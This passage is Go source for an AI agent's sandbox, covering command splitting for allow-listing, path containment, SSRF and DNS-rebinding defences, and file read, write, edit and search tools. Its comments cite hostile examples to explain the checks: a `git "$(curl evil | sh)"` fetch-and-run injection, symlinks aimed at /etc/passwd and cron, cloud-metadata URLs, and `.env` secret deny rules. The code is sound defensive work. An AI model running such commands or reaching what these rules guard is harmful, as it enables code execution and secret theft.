			// Two-char operators.
			if i+1 < len(cmd) {
				next := cmd[i+1]
				if c == '&' && next == '&' {
					flush()
					i++
					continue
				}
				if c == '|' && next == '|' {
					flush()
					i++
					continue
				}
			}
			// Bare `&` (background) chains commands. Keep `&<digit>` attached so
			// `isRedirectionOperand` can still recognize fragments like `&1`,
			// `&2` produced by splitting at `>` (e.g. `cmd 2>&1` → ["cmd 2",
			// "&1"]). See V-1 in security-report/.
			if c == '&' {
				if i+1 < len(cmd) && cmd[i+1] >= '0' && cmd[i+1] <= '9' {
					current.WriteByte(c)
					continue
				}
				flush()
				continue
			}
			if c == ';' || c == '|' || c == '>' || c == '<' || c == '\n' {
				flush()
				continue
			}
			current.WriteByte(c)
		} else {
			// Inside a quote. Single quotes ('…') are opaque to bash — write through.
			// Double quotes ("…") still expand $(…) and `…` substitutions, so the inner
			// commands must be policy-checked the same way as in the unquoted branch
			// above. Without this, `git "$(curl evil | sh)"` would be a single opaque
			// part and slip past per-part allow-listing under a permitted base command.
			// Conservative behavior: a backslash-escaped `\$(` is also recursed into
			// (over-deny), since legitimate commands rarely embed literal `$(` inside
			// double quotes and false-positive denial is the safer failure mode.
			if quoteChar == '"' {
				if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' {
					flush()
					depth := 1
					j := i + 2
					for j < len(cmd) && depth > 0 {
						switch cmd[j] {
						case '(':
							depth++
						case ')':
							depth--
						}
						if depth == 0 {
							break
						}
						j++
					}
					if j <= len(cmd) && j > i+2 {
						inner := cmd[i+2 : j]
						innerParts := splitByShellOperators(inner)
						parts = append(parts, innerParts...)
					}
					i = j
					continue
				}
				if c == '`' {
					flush()
					j := i + 1
					for j < len(cmd) && cmd[j] != '`' {
						j++
					}
					if j > i+1 {
						inner := cmd[i+1 : j]
						innerParts := splitByShellOperators(inner)
						parts = append(parts, innerParts...)
					}
					i = j
					continue
				}
			}
			current.WriteByte(c)
		}
	}

	flush()
	return parts
}

// MaxSandboxReadBytes caps the total bytes sandbox.Read will load into memory
// regardless of the caller's requested limit. Prevents OOM on huge files.
const MaxSandboxReadBytes = 4 * 1024 * 1024 // 4 MiB

// Read implements the Sandbox interface.
func (s *SandboxImpl) Read(ctx context.Context, req ReadReq) (ReadResp, error) {
	// Clean the path to prevent directory traversal
	cleanPath := filepath.Clean(req.Path)

	// Reject null bytes — Go's os.Open rejects them on Windows but on Unix they
	// are valid filename characters, so explicit rejection is defense-in-depth.
	if strings.IndexByte(cleanPath, 0) >= 0 {
		return ReadResp{}, errors.New("path contains null byte")
	}

	// Resolve to an absolute path and require it to sit inside the working
	// directory. Both relative and absolute inputs go through the same check,
	// so /etc/passwd or C:\Windows\... paths cannot slip past a missing rule.
	if s.wd != "" {
		absWd, err := filepath.Abs(s.wd)
		if err != nil {
			return ReadResp{}, fmt.Errorf("resolve working dir: %w", err)
		}
		var absPath string
		if filepath.IsAbs(cleanPath) {
			absPath = cleanPath
		} else {
			absPath = filepath.Join(absWd, cleanPath)
		}
		absPath = filepath.Clean(absPath)
		rel, err := filepath.Rel(absWd, absPath)
		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			return ReadResp{}, fmt.Errorf("path outside working directory: %s", req.Path)
		}
		// Resolve symlinks and re-check containment. A file that sits inside the
		// wd lexically but whose target escapes (e.g. symlink pointing at
		// /etc/passwd) must be refused. EvalSymlinks fails if the file doesn't
		// exist yet; we only validate when it resolves.
		if resolved, rerr := filepath.EvalSymlinks(absPath); rerr == nil {
			resolvedWd, werr := filepath.EvalSymlinks(absWd)
			if werr != nil {
				resolvedWd = absWd
			}
			relResolved, err := filepath.Rel(resolvedWd, resolved)
			if err != nil || relResolved == ".." || strings.HasPrefix(relResolved, ".."+string(filepath.Separator)) {
				return ReadResp{}, fmt.Errorf("path outside working directory after symlink resolution: %s", req.Path)
			}
		}
		cleanPath = absPath
	} else if filepath.IsAbs(cleanPath) {
		// No working directory configured: refuse absolute paths rather than
		// silently trusting whatever policy rules exist.
		return ReadResp{}, errors.New("absolute paths not allowed without working directory")
	}

	// Policy check with the clean path
	if err := s.PolicyCheck("read", cleanPath); err != nil {
		return ReadResp{}, err
	}

	// Streaming read with an upper bound to keep memory bounded on huge files.
	f, err := os.Open(cleanPath)
	if err != nil {
		return ReadResp{}, err
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return ReadResp{}, err
	}
	if fi.IsDir() {
		return ReadResp{}, fmt.Errorf("cannot read directory: %s", req.Path)
	}
	totalSize := fi.Size()

	if req.Offset < 0 {
		req.Offset = 0
	}
	if req.Limit < 0 {
		req.Limit = 0
	}
	if req.Offset > 0 {
		if _, err := f.Seek(req.Offset, io.SeekStart); err != nil {
			return ReadResp{}, err
		}
	}
	readBudget := int64(MaxSandboxReadBytes)
	if req.Limit > 0 && req.Limit < readBudget {
		readBudget = req.Limit
	}
	data, err := io.ReadAll(io.LimitReader(f, readBudget))
	if err != nil {
		return ReadResp{}, err
	}

	content := string(data)
	// Trim a trailing partial UTF-8 rune when readBudget actually clipped the
	// file — without this a multi-byte character cut at the boundary reaches
	// the consumer as invalid UTF-8 (encoding/json emits U+FFFD on marshal).
	if int64(len(data)) >= readBudget && totalSize-req.Offset > readBudget {
		content = trimPartialRune(content)
	}

	// Apply unified return-policy filter; see ApplyReturnPolicy for rules.
	// RawContent preserves the full bytes for the content store.
	filtered := ApplyReturnPolicy(content, req.Intent, req.Return)

	return ReadResp{
		Content:    filtered.Body,
		RawContent: content,
		Matches:    filtered.Matches,
		Summary:    filtered.Summary,
		Size:       totalSize,
		ReadBytes:  int64(len(content)),
	}, nil
}

// MaxFetchBodyBytes caps the size of an HTTP response body that Fetch will read.
const MaxFetchBodyBytes = 8 * 1024 * 1024 // 8 MiB

// normalizeFetchURLForPolicy returns rawURL with its scheme and host
// lowercased so case-insensitive match succeeds against deny rules written
// in conventional lowercase form. Path/query stay as-is (paths may be
// case-sensitive on the target server). On parse failure rawURL is
// returned unchanged — PolicyCheck will deny obviously malformed URLs
// either way and assertFetchURLAllowed re-parses for the SSRF check.
func normalizeFetchURLForPolicy(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	if u.Scheme != "" {
		u.Scheme = strings.ToLower(u.Scheme)
	}
	if u.Host != "" {
		u.Host = strings.ToLower(u.Host)
	}
	return u.String()
}

// assertFetchURLAllowed refuses URLs that target loopback, private, link-local,
// multicast, or cloud metadata ranges. Call on the initial URL and again on
// every redirect.
func assertFetchURLAllowed(rawURL string) error {
	u, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("parse url: %w", err)
	}
	switch strings.ToLower(u.Scheme) {
	case "http", "https":
		// ok
	default:
		return fmt.Errorf("%w: unsupported scheme %q", ErrBlockedHost, u.Scheme)
	}
	host := u.Hostname()
	if host == "" {
		return fmt.Errorf("%w: empty host", ErrBlockedHost)
	}
	// V-13: explicit zone-id reject. `[fe80::1%25eth0]` survives url.Parse
	// and url.Hostname() returns `fe80::1%eth0` (zone separator decoded).
	// net.ParseIP rejects strings with `%`, so without this check the host
	// would silently fall through to LookupIP and surface as a generic DNS
	// failure. A zone-id is a same-machine concept; surface it as the
	// SSRF policy rejection it actually is.
	if strings.Contains(host, "%") {
		return fmt.Errorf("%w: IPv6 zone-id not permitted in fetch host %q", ErrBlockedHost, host)
	}
	// Well-known cloud metadata hostnames. Block these before DNS so a
	// resolver that maps them to public IPs cannot evade the IP filter.
	lowerHost := strings.ToLower(host)
	if lowerHost == "metadata.google.internal" || lowerHost == "metadata.goog" ||
		lowerHost == "metadata.goog.internal" || lowerHost == "metadata.goog.com" {
		return fmt.Errorf("%w: cloud metadata host %q", ErrBlockedHost, host)
	}
	// Host is allowed to be a bare IP literal; parse first so we don't need DNS.
	if ip := net.ParseIP(host); ip != nil {
		if isBlockedIP(ip) {
			return fmt.Errorf("%w: literal address %s is blocked", ErrBlockedHost, ip)
		}
		return nil
	}
	// Resolve host to IP(s) and reject if any address falls in a blocked range.
	// A DNS failure is treated as block, not allow: the previous "pass on
	// LookupIP error" behavior allowed attacker-controlled hostnames that
	// briefly NXDOMAIN'd but later resolved to an internal IP — the HTTP
	// client's own resolver could hit a different result than ours.
	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("%w: DNS resolution failed for %s: %v", ErrBlockedHost, host, err)
	}
	if len(ips) == 0 {
		return fmt.Errorf("%w: no addresses for %s", ErrBlockedHost, host)
	}
	for _, ip := range ips {
		if isBlockedIP(ip) {
			return fmt.Errorf("%w: %s resolved to blocked address %s", ErrBlockedHost, host, ip)
		}
	}
	return nil
}

// isBlockedIP returns true if ip is a loopback, private (RFC1918/ULA),
// link-local, multicast, unspecified, or cloud-metadata IP.
func isBlockedIP(ip net.IP) bool {
	if ip == nil {
		return true
	}
	if ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
		ip.IsMulticast() || ip.IsUnspecified() || ip.IsInterfaceLocalMulticast() {
		return true
	}
	if ip.IsPrivate() {
		return true
	}
	// Cloud metadata literals.
	if ip.Equal(net.IPv4(169, 254, 169, 254)) {
		return true // AWS IMDS (IPv4)
	}
	if ip.Equal(net.IPv4(168, 63, 129, 16)) {
		return true // Azure IMDS
	}
	if ip.Equal(net.ParseIP("fd00:ec2::254")) {
		return true // AWS IMDS (IPv6)
	}
	// 0.0.0.0/8 - explicitly block any lingering non-routable addresses.
	if v4 := ip.To4(); v4 != nil && v4[0] == 0 {
		return true
	}
	return false
}

// ErrBlockedHost indicates the target host/IP falls into a blocked range
// (loopback, private, link-local, cloud metadata, etc.) and was refused for SSRF reasons.
var ErrBlockedHost = errors.New("host blocked by SSRF policy")

// ErrBatchExecNotImplemented indicates BatchExec is not yet implemented.
var ErrBatchExecNotImplemented = errors.New("batch exec not implemented")

// Fetch implements the Sandbox interface.
func (s *SandboxImpl) Fetch(ctx context.Context, req FetchReq) (FetchResp, error) {
	// Policy check. URLs are normalized first so deny rules like
	// `http://169.254.169.254/*` match `HTTP://169.254.169.254/foo`. The
	// scheme and host components are case-insensitive per RFC 3986; the
	// path portion stays case-sensitive (paths can be case-sensitive on
	// real servers). Closes F-28: pre-fix, an attacker could try
	// `HTTPS://metadata.google.internal/...` and the cloud-metadata deny
	// glob would never fire because the regex compare was byte-for-byte.
	if err := s.PolicyCheck("fetch", normalizeFetchURLForPolicy(req.URL)); err != nil {
		return FetchResp{}, err
	}

	// SSRF pre-check on the initial URL.
	if err := assertFetchURLAllowed(req.URL); err != nil {
		return FetchResp{}, err
	}

	// Basic HTTP fetch
	method := req.Method
	if method == "" {
		method = "GET"
	}

	var bodyReader io.Reader
	if req.Body != "" {
		bodyReader = strings.NewReader(req.Body)
	}

	httpReq, err := http.NewRequestWithContext(ctx, method, req.URL, bodyReader)
	if err != nil {
		return FetchResp{}, fmt.Errorf("create request: %w", err)
	}

	// V-13: validate header keys and values for CR/LF before Header.Set.
	// Go's net/http only enforces this at request-write time and surfaces a
	// generic "net/http: invalid header field …" — by that point the SSRF
	// pre-check, dialer setup, and DNS work has already been spent. Reject
	// upfront so the caller sees the actual reason.
	for k, v := range req.Headers {
		if strings.ContainsAny(k, "\r\n:") || strings.ContainsAny(v, "\r\n") {
			return FetchResp{}, fmt.Errorf("invalid header %q: contains CR/LF or colon", k)
		}
		httpReq.Header.Set(k, v)
	}

	// Guard against an unset/zero-value timeout. req.Timeout == 0 would
	// produce client.Timeout == 0, which means "no deadline" — a slow or
	// malicious server could then hang the goroutine indefinitely.
	timeout := req.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	// DNS-rebinding-safe transport: DialContext resolves the host itself,
	// validates every returned IP, and dials the literal IP. Without this,
	// http.Transport performs a *second* DNS lookup after assertFetchURLAllowed
	// and an attacker-controlled authoritative server can return a public IP
	// for the pre-check and 127.0.0.1 / 169.254.169.254 for the connect.
	dialer := &net.Dialer{Timeout: timeout, KeepAlive: 30 * time.Second}
	transport := &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			host, port, err := net.SplitHostPort(addr)
			if err != nil {
				return nil, err
			}
			// IP literal: validate once, dial directly.
			if ip := net.ParseIP(host); ip != nil {
				if isBlockedIP(ip) {
					return nil, fmt.Errorf("%w: literal address %s is blocked", ErrBlockedHost, ip)
				}
				return dialer.DialContext(ctx, network, addr)
			}
			// Hostname: resolve, validate every result, then dial the first
			// allowed IP by its literal address. Dialing the hostname again
			// here would reopen the rebinding window.
			ips, err := net.DefaultResolver.LookupIP(ctx, "ip", host)
			if err != nil {
				return nil, fmt.Errorf("%w: DNS resolution failed for %s: %v", ErrBlockedHost, host, err)
			}
			if len(ips) == 0 {
				return nil, fmt.Errorf("%w: no addresses for %s", ErrBlockedHost, host)
			}
			for _, ip := range ips {
				if isBlockedIP(ip) {
					return nil, fmt.Errorf("%w: %s resolved to blocked address %s", ErrBlockedHost, host, ip)
				}
			}
			return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].String(), port))
		},
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: timeout,
		MaxIdleConns:          10,
		IdleConnTimeout:       90 * time.Second,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Timeout:   timeout,
		Transport: transport,
		// Re-check every redirect target against SSRF policy.
		CheckRedirect: func(r *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return errors.New("stopped after 10 redirects")
			}
			return assertFetchURLAllowed(r.URL.String())
		},
	}
	resp, err := client.Do(httpReq)
	if err != nil {
		return FetchResp{}, fmt.Errorf("fetch: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()

	// Cap body size to avoid runaway memory on huge responses.
	body, err := io.ReadAll(io.LimitReader(resp.Body, int64(MaxFetchBodyBytes)))
	if err != nil {
		return FetchResp{}, fmt.Errorf("read body: %w", err)
	}

	headers := make(map[string]string)
	for k, vv := range resp.Header {
		if len(vv) > 0 {
			headers[k] = vv[0]
		}
	}

	content := string(body)

	// Apply unified return-policy filter; see ApplyReturnPolicy for rules.
	// RawBody preserves the full bytes for the content store.
	filtered := ApplyReturnPolicy(content, req.Intent, req.Return)

	return FetchResp{
		Status:     resp.StatusCode,
		Headers:    headers,
		Body:       filtered.Body,
		RawBody:    content,
		Matches:    filtered.Matches,
		Summary:    filtered.Summary,
		Vocabulary: filtered.Vocabulary,
	}, nil
}

// BatchExec implements the Sandbox interface.
func (s *SandboxImpl) BatchExec(ctx context.Context, items []any) ([]any, error) {
	return nil, ErrBatchExecNotImplemented
}

// Glob implements the Sandbox interface.
func (s *SandboxImpl) Glob(ctx context.Context, req GlobReq) (GlobResp, error) {
	// Resolve working directory
	wd := s.wd
	if wd == "" {
		wd = "."
	}

	absWd, err := filepath.Abs(wd)
	if err != nil {
		return GlobResp{}, fmt.Errorf("resolve working directory: %w", err)
	}

	// Clean and resolve the glob pattern
	pattern := req.Pattern
	if !filepath.IsAbs(pattern) {
		pattern = filepath.Join(absWd, pattern)
	}
	pattern = filepath.Clean(pattern)

	// Verify the pattern stays within working directory
	rel, err := filepath.Rel(absWd, pattern)
	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return GlobResp{}, fmt.Errorf("pattern outside working directory: %s", req.Pattern)
	}

	// Policy check on the directory
	if err := s.PolicyCheck("read", absWd); err != nil {
		return GlobResp{}, err
	}

	// Execute glob
	matches, err := filepath.Glob(pattern)
	if err != nil {
		return GlobResp{}, fmt.Errorf("glob pattern: %w", err)
	}

	// Filter to only files (not directories), drop anything the read policy
	// denies (F-02: a deny rule like `read **/.env*` must keep dfmt_glob from
	// surfacing the file's existence — otherwise the agent learns the path
	// even when the eventual Read would refuse), and make paths relative.
	// Filtering is silent: callers are not told *which* paths were withheld,
	// only that the result list is shorter than a raw glob would produce.
	var files []string
	for _, m := range matches {
		fi, err := os.Stat(m)
		if err != nil {
			continue
		}
		if fi.IsDir() {
			continue
		}
		if perr := s.PolicyCheck("read", m); perr != nil {
			continue
		}
		relPath, _ := filepath.Rel(absWd, m)
		files = append(files, relPath)
	}

	// Intent-based filtering
	var contentMatches []ContentMatch
	keywords := ExtractKeywords(req.Intent)
	if len(keywords) > 0 && len(files) > 0 {
		// Read first few files to find intent matches
		for _, f := range files {
			if len(contentMatches) >= 10 {
				break
			}
			fullPath := filepath.Join(absWd, f)
			// V-01: refuse to read through a symlink leaf whose target
			// escapes wd. Lexical containment above only proves the link
			// path is in-bounds; os.ReadFile would follow it to wherever
			// the link points. Read does the equivalent EvalSymlinks
			// check inline; safefs.EnsureResolvedUnder keeps Glob's
			// intent-content path on the same boundary.
			if _, sym := safefs.EnsureResolvedUnder(fullPath, absWd); sym != nil {
				continue
			}
			data, err := os.ReadFile(fullPath)
			if err != nil {
				continue
			}
			content := string(data)
			lineMatches := MatchContent(content, keywords, 3)
			for _, m := range lineMatches {
				contentMatches = append(contentMatches, ContentMatch{
					Text:   m.Text,
					Score:  m.Score,
					Source: f,
					Line:   m.Line,
				})
			}
		}
	}

	// Cap inline file list. A glob like "**/*" on a large repo can return tens
	// of thousands of paths — inlining that defeats the project's purpose.
	// Beyond the cap, agents must narrow the pattern or use Grep with intent.
	const maxGlobInlineFiles = 500
	totalFiles := len(files)
	if len(files) > maxGlobInlineFiles {
		files = files[:maxGlobInlineFiles]
	}

	resp := GlobResp{
		Files:   files,
		Matches: contentMatches,
	}
	if totalFiles > maxGlobInlineFiles {
		// Use Matches as a side channel to surface the truncation; consumers
		// already display Matches in their summary.
		resp.Matches = append(resp.Matches, ContentMatch{
			Text: fmt.Sprintf("(truncated: %d more files not shown; refine pattern)", totalFiles-maxGlobInlineFiles),
		})
	}
	return resp, nil
}

// Grep implements the Sandbox interface.
func (s *SandboxImpl) Grep(ctx context.Context, req GrepReq) (GrepResp, error) {
	// Resolve working directory
	wd := s.wd
	if wd == "" {
		wd = "."
	}

	absWd, err := filepath.Abs(wd)
	if err != nil {
		return GrepResp{}, fmt.Errorf("resolve working directory: %w", err)
	}

	// Policy check on the directory
	if err := s.PolicyCheck("read", absWd); err != nil {
		return GrepResp{}, err
	}

	if err := validateGrepPattern(req.Pattern); err != nil {
		return GrepResp{}, err
	}

	// Compile regex pattern. Go's regexp engine is RE2-based and linear-time;
	// the validator above bounds compile/match resource use for very large or
	// deeply repetitive user-provided patterns.
	var pattern *regexp.Regexp
	if req.CaseInsensitive {
		pattern, err = regexp.Compile("(?i)" + req.Pattern)
	} else {
		pattern, err = regexp.Compile(req.Pattern)
	}
	if err != nil {
		return GrepResp{}, fmt.Errorf("invalid pattern: %w", err)
	}

	// Resolve the walk root. req.Path scopes the search to a subtree (or
	// a single file); without it the walk descends from absWd. The path
	// is untrusted input, so we clean + absolutize + reject anything
	// that escapes absWd. Per-file PolicyCheck below is the second line
	// of defense, so even a symlink that points outside absWd cannot
	// leak content.
	searchRoot := absWd
	if req.Path != "" {
		p := filepath.Clean(req.Path)
		if !filepath.IsAbs(p) {
			p = filepath.Join(absWd, p)
		}
		rel, rerr := filepath.Rel(absWd, p)
		if rerr != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			return GrepResp{}, fmt.Errorf("grep path escapes working directory: %s", req.Path)
		}
		if _, serr := os.Stat(p); serr != nil {
			return GrepResp{}, fmt.Errorf("grep path: %w", serr)
		}
		searchRoot = p
	}

	// Walk recursively from searchRoot. The previous implementation used
	// filepath.Glob(absWd + "/**/*") which silently degraded to a
	// non-recursive depth-2 match — Go's stdlib Glob does NOT treat **
	// as a recursive wildcard, so matches in nested dirs (the typical
	// case) were missing. WalkDir walks the actual tree.
	var grepMatches []GrepMatch
	totalFiles := 0
	walkErr := filepath.WalkDir(searchRoot, func(path string, d fs.DirEntry, werr error) error {
		if werr != nil {
			// Unreadable dir/file — skip and continue.
			return nil
		}
		if len(grepMatches) >= 100 {
			return filepath.SkipAll
		}
		if d.IsDir() {
			return nil
		}

		// Lexical containment: refuse paths whose textual form escapes
		// absWd (e.g. `..\..\etc\passwd` after a buggy join). This is a
		// fast pre-filter; the symlink-target check below is what
		// actually closes the renamed-symlink-leaf bypass.
		rel, rerr := filepath.Rel(absWd, path)
		if rerr != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			return nil
		}

		// Files glob: a basename pattern (e.g. "*.go") applied per file.
		// Empty pattern matches everything. Matches are basename-only by
		// design — agents asking for "*.go" want every .go file under
		// the search root, not just the top level.
		if req.Files != "" {
			if ok, _ := filepath.Match(req.Files, d.Name()); !ok {
				return nil
			}
		}

		// F-02: per-file deny-rule enforcement. The directory-level
		// PolicyCheck above only blocks if the wd itself is denied;
		// per-file rules like `read **/.env*` need to be applied here,
		// before reading. Without this, dfmt_grep "API_KEY" --files "*"
		// would surface secrets that direct dfmt_read of .env refuses.
		if perr := s.PolicyCheck("read", path); perr != nil {
			return nil
		}

		// V-01: refuse to read through a symlink leaf whose target
		// escapes wd. The lexical Rel check above is purely textual —
		// a symlink `notes.txt -> /etc/passwd` looks contained but
		// os.ReadFile follows it. Read does the equivalent inline;
		// EnsureResolvedUnder centralizes the pattern.
		if _, sym := safefs.EnsureResolvedUnder(path, absWd); sym != nil {
			return nil
		}

		data, rerr := os.ReadFile(path)
		if rerr != nil {
			return nil
		}
		totalFiles++

		lines := strings.Split(string(data), "\n")
		for lineNum, line := range lines {
			if pattern.MatchString(line) {
				grepMatches = append(grepMatches, GrepMatch{
					File:    rel,
					Line:    lineNum + 1,
					Content: line,
				})
				if len(grepMatches) >= 100 {
					return filepath.SkipAll
				}
			}
		}
		return nil
	})
	if walkErr != nil && !errors.Is(walkErr, filepath.SkipAll) {
		return GrepResp{}, fmt.Errorf("grep walk: %w", walkErr)
	}

	// Generate summary
	summary := fmt.Sprintf("Found %d matches in %d files", len(grepMatches), totalFiles)

	// Intent-based filtering on matches
	var filteredMatches []GrepMatch
	keywords := ExtractKeywords(req.Intent)
	if len(keywords) > 0 {
		for _, m := range grepMatches {
			if MatchContent(m.Content, keywords, 1) != nil {
				filteredMatches = append(filteredMatches, m)
			}
		}
		if len(filteredMatches) > 0 {
			summary += fmt.Sprintf(" (filtered by intent: %d matches)", len(filteredMatches))
			grepMatches = filteredMatches
		}
	}

	// Trim per-line content so a regex matching very long lines (minified JS,
	// log dumps) doesn't push the response into the megabytes — grep is meant
	// for navigation, not bulk extraction.
	const maxGrepLineBytes = 200
	for i := range grepMatches {
		if len(grepMatches[i].Content) > maxGrepLineBytes {
			grepMatches[i].Content = truncate(grepMatches[i].Content, maxGrepLineBytes)
		}
	}

	return GrepResp{
		Matches: grepMatches,
		Summary: summary,
	}, nil
}

func validateGrepPattern(pattern string) error {
	if len(pattern) > maxGrepPatternBytes {
		return fmt.Errorf("grep pattern too large: %d bytes exceeds %d", len(pattern), maxGrepPatternBytes)
	}

	re, err := syntax.Parse(pattern, syntax.Perl)
	if err != nil {
		return fmt.Errorf("invalid pattern: %w", err)
	}

	nodes, repeatDepth := grepPatternComplexity(re, 0)
	if nodes > maxGrepPatternNodes {
		return fmt.Errorf("grep pattern too complex: %d nodes exceeds %d", nodes, maxGrepPatternNodes)
	}
	if repeatDepth > maxGrepRepeatNesting {
		return fmt.Errorf("grep pattern repeat nesting too deep: %d exceeds %d", repeatDepth, maxGrepRepeatNesting)
	}
	return nil
}

func grepPatternComplexity(re *syntax.Regexp, repeatDepth int) (nodes int, maxRepeatDepth int) {
	if re == nil {
		return 0, repeatDepth
	}
	nodes = 1
	childRepeatDepth := repeatDepth
	switch re.Op {
	case syntax.OpStar, syntax.OpPlus, syntax.OpQuest, syntax.OpRepeat:
		childRepeatDepth++
	}
	maxRepeatDepth = childRepeatDepth
	for _, sub := range re.Sub {
		subNodes, subRepeatDepth := grepPatternComplexity(sub, childRepeatDepth)
		nodes += subNodes
		if subRepeatDepth > maxRepeatDepth {
			maxRepeatDepth = subRepeatDepth
		}
	}
	return nodes, maxRepeatDepth
}

// Edit implements the Sandbox interface.
func (s *SandboxImpl) Edit(ctx context.Context, req EditReq) (EditResp, error) {
	wd := s.wd
	if wd == "" {
		wd = "."
	}

	absWd, err := filepath.Abs(wd)
	if err != nil {
		return EditResp{}, fmt.Errorf("resolve working directory: %w", err)
	}

	// Resolve file path
	cleanPath := req.Path
	if !filepath.IsAbs(cleanPath) {
		cleanPath = filepath.Join(absWd, cleanPath)
	}
	cleanPath = filepath.Clean(cleanPath)
	// Reject null bytes — Go's os.Open rejects them on Windows but on Unix
	// they are valid filename characters, so explicit rejection is defense-in-depth.
	if strings.IndexByte(cleanPath, 0) >= 0 {
		return EditResp{}, errors.New("path contains null byte")
	}

	// Verify path is within working directory
	rel, err := filepath.Rel(absWd, cleanPath)
	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return EditResp{}, fmt.Errorf("path outside working directory: %s", req.Path)
	}

	// Refuse if any path segment beneath wd is a symlink (closes F-04 for the
	// Edit path, including the target-missing case where the previous
	// EvalSymlinks-only gate returned without checking).
	if err := safefs.CheckNoSymlinks(absWd, cleanPath); err != nil {
		return EditResp{}, fmt.Errorf("path symlink check: %w", err)
	}

	// Policy check — Edit is both a write and an edit. Run BOTH checks so
	// that:
	//   - existing `Op: "write"` deny rules continue to protect Edit calls
	//     (they have always done so via this code path);
	//   - explicit `Op: "edit"` deny rules in user policies actually fire
	//     (closes F-29: the DefaultPolicy carries `edit` mirrors of every
	//     `write` deny but Edit only invoked PolicyCheck("write"), making
	//     the `edit` rules dead in the default config).
	if err := s.PolicyCheck("write", cleanPath); err != nil {
		return EditResp{}, err
	}
	if err := s.PolicyCheck("edit", cleanPath); err != nil {
		return EditResp{}, err
	}

	// Read current content
	data, err := os.ReadFile(cleanPath)
	if err != nil {
		return EditResp{}, fmt.Errorf("read file: %w", err)
	}
	content := string(data)

	// Check if old string exists
	if !strings.Contains(content, req.OldString) {
		return EditResp{}, fmt.Errorf("old string not found in file: %s", req.Path)
	}

	// Replace
	newContent := strings.Replace(content, req.OldString, req.NewString, 1)

	// Write back, preserving original mode where possible. We re-stat instead
	// of trusting WriteFileAtomic's perm arg (which only takes effect on
	// create) so a 0600 secrets file edited by an agent keeps its 0600 mode.
	//
	// WriteFileAtomic (tmp + rename) closes the F-R-LOW-1 TOCTOU window
	// from the security audit: the previous WriteFile path was Lstat-then-
	// open, so an attacker who could swap `cleanPath` for a symlink between
	// the CheckNoSymlinks call above and the open could still write through
	// that symlink. Rename(2) replaces the symlink as a directory entry
	// rather than following it, so the race window is closed at the cost
	// of breaking pre-existing hard links to the target — an acceptable
	// trade-off for an agent-driven editor.
	mode := os.FileMode(0o600)
	if fi, ferr := os.Stat(cleanPath); ferr == nil {
		mode = fi.Mode().Perm()
	}
	if err := safefs.WriteFileAtomic(absWd, cleanPath, []byte(newContent), mode); err != nil {
		return EditResp{}, fmt.Errorf("write file: %w", err)
	}

	return EditResp{
		Success: true,
		Summary: fmt.Sprintf("Replaced string in %s", req.Path),
	}, nil
}

// Write implements the Sandbox interface.
func (s *SandboxImpl) Write(ctx context.Context, req WriteReq) (WriteResp, error) {
	wd := s.wd
	if wd == "" {
		wd = "."
	}

	absWd, err := filepath.Abs(wd)
	if err != nil {
		return WriteResp{}, fmt.Errorf("resolve working directory: %w", err)
	}

	// Resolve file path
	cleanPath := req.Path
	if !filepath.IsAbs(cleanPath) {
		cleanPath = filepath.Join(absWd, cleanPath)
	}
	cleanPath = filepath.Clean(cleanPath)
	// Reject null bytes — Go's os.Open rejects them on Windows but on Unix
	// they are valid filename characters, so explicit rejection is defense-in-depth.
	if strings.IndexByte(cleanPath, 0) >= 0 {
		return WriteResp{}, errors.New("path contains null byte")
	}

	// Verify path is within working directory
	rel, err := filepath.Rel(absWd, cleanPath)
	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return WriteResp{}, fmt.Errorf("path outside working directory: %s", req.Path)
	}

	// Refuse if any path segment beneath wd is a symlink (closes F-04). The
	// previous EvalSymlinks-only gate skipped the check entirely when the
	// target file didn't exist, which let an attacker plant
	// `wd/leak -> /etc/cron.d/x` and then have the agent write through it.
	// safefs.CheckNoSymlinks Lstat-walks each component so missing-leaf
	// cases still reject symlinked parents.
	if err := safefs.CheckNoSymlinks(absWd, cleanPath); err != nil {
		return WriteResp{}, fmt.Errorf("path symlink check: %w", err)
	}

	// Policy check - write permission
	if err := s.PolicyCheck("write", cleanPath); err != nil {
		return WriteResp{}, err
	}

	// Ensure parent directory exists. Use 0o700 so newly-created intermediate
	// directories aren't world-readable on multi-user hosts. The .dfmt
	// directory itself is 0o700 — sandbox writes follow the same hygiene.
	if err := os.MkdirAll(filepath.Dir(cleanPath), 0o700); err != nil {
		return WriteResp{}, fmt.Errorf("create directory: %w", err)
	}

	// Write file with owner-only permissions for new files. If the file
	// already exists, preserve its mode (an agent shouldn't widen access on
	// an existing file by overwriting it).
	//
	// WriteFileAtomic (tmp + rename) closes the F-R-LOW-1 TOCTOU window
	// from the security audit: rename(2) replaces a symlink that an
	// attacker raced into the leaf position rather than following it.
	// Trade-off: any hard links to a pre-existing target are broken on
	// overwrite — acceptable for an agent-driven file writer.
	mode := os.FileMode(0o600)
	if fi, ferr := os.Stat(cleanPath); ferr == nil {
		mode = fi.Mode().Perm()
	}
	if err := safefs.WriteFileAtomic(absWd, cleanPath, []byte(req.Content), mode); err != nil {
		return WriteResp{}, fmt.Errorf("write file: %w", err)
	}

	return WriteResp{
		Success: true,
		Summary: fmt.Sprintf("Wrote %d bytes to %s", len(req.Content), req.Path),
	}, nil
}

// execImpl performs the actual execution.
func (s *SandboxImpl) execImpl(ctx context.Context, req ExecReq, rt Runtime) (ExecResp, error) {
